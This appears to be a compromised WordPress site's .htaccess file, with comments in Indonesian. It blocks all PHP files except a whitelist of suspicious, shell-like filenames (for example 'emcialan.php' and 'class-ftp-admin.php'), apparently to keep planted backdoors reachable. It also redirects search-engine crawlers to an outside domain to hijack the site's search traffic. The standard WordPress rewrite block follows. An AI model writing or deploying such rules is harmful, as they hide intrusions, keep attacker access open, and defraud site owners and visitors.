Options -Indexes

# Blokir semua file PHP dan turunannya
<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|Phtml|PHtml|PhTml|PhtMl|PhtmL|pHtml|pHTml|pHtMl|pHtmL|phTml|phTMl|phTmL|phtMl|phtML|PHT|Pht|PHt|PhT|pHt|pHT|php7)$">
  Order allow,deny
  Deny from all
</FilesMatch>

# Kecualikan beberapa file PHP penting agar tetap bisa diakses
<FilesMatch "^(index.php|emcialan.php|block-capabilities.php|.config.inc.php|admin-sync.php|class-ftp-admin.php|repair.php|site-options.php|options.php|reboot.php|author-settings.php|class-popup-themes.php|script-loader-adminer.php|form.php|post-navigation.php|class-walker-tag-checklist.php|edit-form-login.php|ms-signin.php|site-loginform.php|installer.php|post-blocks.php|rebuildSearchEngine.php|ManagedFiles.php|Ipv4.php|license.php|OutputOptions.php|DeclarationOptions.php|DefaultConfiguration.php|htmloptions.php)$">
  Order allow,deny
  Allow from all
</FilesMatch>

# Redirect bot ke URL target
<IfModule mod_rewrite.c>
  RewriteEngine On

  # Deteksi User-Agent bot
  RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]

  # Redirect 301 hanya untuk bot
  RewriteRule ^(.*)$ https://fucjef.net/ [R=301,L]
</IfModule>

DirectoryIndex index.php

# php -- BEGIN cPanel-generated handler, do not edit
# Set the “ea-php82” package as the default “PHP” programming language.
<IfModule mime_module>
  AddHandler application/x-httpd-ea-php82 .php .php8 .phtml
</IfModule>
# php -- END cPanel-generated handler, do not edit

# BEGIN WordPress
# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
  RewriteBase /
  RewriteRule ^index\.php$ - [L]
  RewriteCond %{REQUEST_FILENAME} !-f
  RewriteCond %{REQUEST_FILENAME} !-d
  RewriteRule . /index.php [L]
</IfModule>
# END WordPress